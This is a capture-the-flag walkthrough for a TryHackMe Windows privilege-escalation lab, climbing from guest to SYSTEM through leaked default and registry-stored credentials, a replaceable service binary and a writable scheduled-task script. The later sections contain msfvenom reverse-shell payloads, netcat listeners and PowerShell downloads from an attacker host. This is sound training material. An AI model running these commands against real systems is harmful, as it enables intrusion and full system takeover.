# [Windows Jump](https://tryhackme.com/room/windowsjump)

## Use privilege escalation knowledge to jump from a guest user to SYSTEM.

# Challenge

A routine vulnerability scan flagged a Windows machine on the internal network; nothing alarming on the surface, just a standard workstation left behind after a round of layoffs. IT never cleaned it up properly. Your job is to find out how badly. Your objective is to escalate from guest access all the way through: `guest->thmuser->notadmin->svcadmin->SYSTEM`

### What are the contents of `flag1.txt`?

1. Start with port enumeration to identify exposed services.

```bash
nmap -p- <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
```

> RDP is available on port `3389`, and SMB is available on `445`. These are the key services for initial access.

2. Enumerate SMB shares anonymously.

```bash
smbclient -L //<TARGET_IP> -N
```

**Results:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Public          Disk      Public file share
```

> The `Public` share is accessible anonymously, so check it for useful files.

3. Download the welcome file from the `Public` share.

```bash
smbclient //<TARGET_IP>/Public -N
get welcome.txt
```

**Results:**

```
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!

Please change your password after first login.
```

4. Use RDP to connect as `thmuser`.

```bash
xfreerdp /u:thmuser /p:Password1! /v:<TARGET_IP>
```

5. Once logged in as `thmuser`, read the first flag from `C:\Users\thmuser\Desktop\flag1.txt`

[SCREEN01]

---

### What are the contents of `flag2.txt`?

1. Enumerate Windows registry settings for Winlogon.

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Results:**

```
DefaultUserName    REG_SZ    notadmin
DefaultPassword    REG_SZ    P@ssw0rd!
```

2. Use `runas` to escalate to `notadmin`.

```bash
runas /user:PRIVESC\notadmin cmd.exe
```

3. Read the second flag from `notadmin`'s desktop.

```bash
type C:\Users\notadmin\Desktop\flag2.txt
```

---

### What are the contents of `flag3.txt`?

1. Enumerate services to find one running as `svcadmin`.

```bash
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

**Results:**

```
THMSvc                                    C:\Windows\THMSVC\svc.exe
.\svcadmin
```

> The `THMSvc` service runs as `svcadmin` and its binary is located in `C:\Windows\THMSVC\svc.exe`.

2. Check ACLs on the service directory.

```bash
icacls C:\Windows\THMSVC\
```

**Results:**

```
C:\Windows\THMSVC PRIVESC\notadmin:(OI)(CI)(F)                                                                                            BUILTIN\Administrators:(OI)(CI)(F)
NT AUTHORITY\SYSTEM:(OI)(CI)(F)
```

> `notadmin` has full control over `C:\Windows\THMSVC\`. This means we can replace the service binary and then start the service to execute code as `svcadmin`.

3. Build a service executable that connects back to the attacker.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe-service -o svc.exe
```

4. Start a listener on the attacker machine.

```bash
nc -lvnp 4444
```

5. Host the payload for download.

```bash
python3 -m http.server
```

6. Download the malicious service executable onto the target.

```bash
powershell
Invoke-WebRequest -Uri "http://<ATTACKER_IP>:8000/svc.exe" -OutFile "C:\Windows\THMSVC\svc.exe"
```

7. Start the service to execute the payload.

```bash
sc.exe start THMSvc
```

8. Once the reverse shell connects, read the third flag.

```bash
type C:\Users\svcadmin\Desktop\flag3.txt
```

[SCREEN03]

---

### What are the contents of `flag4.txt`?

1. Inspect the scheduled task cleanup script.

```bash
type C:\Windows\tasks\cleanup.bat
```

**Results:**

```bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

2. Check the ACL on `cleanup.bat`.

```bash
icacls C:\Windows\tasks\cleanup.bat
```

**Results:**

```
C:\Windows\tasks\cleanup.bat BUILTIN\Users:(I)(RX)
                             PRIVESC\svcadmin:(I)(M)
                             BUILTIN\Administrators:(I)(F)
                             NT AUTHORITY\SYSTEM:(I)(F)
```

> `svcadmin` has modify access to this batch file, so we can replace it with a payload that will run as SYSTEM when the scheduled task executes.

3. Generate a reverse shell executable.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=5555 -f exe -o shell.exe
```

4. Start a listener for the SYSTEM shell.

```bash
nc -lvnp 5555
```

5. Download the payload to the task folder and overwrite `cleanup.bat` so it launches the payload.

```bash
powershell
Invoke-WebRequest -Uri "http://<ATTACKER_IP>:8000/shell.exe" -OutFile "C:\Windows\tasks\shell.exe"
cmd /c "echo C:\Windows\tasks\shell.exe > C:\Windows\tasks\cleanup.bat"
```

6. Wait for the scheduled task to execute, catch the SYSTEM shell and read the final flag.

```bash
type C:\flag4.txt
```

[SCREEN04]
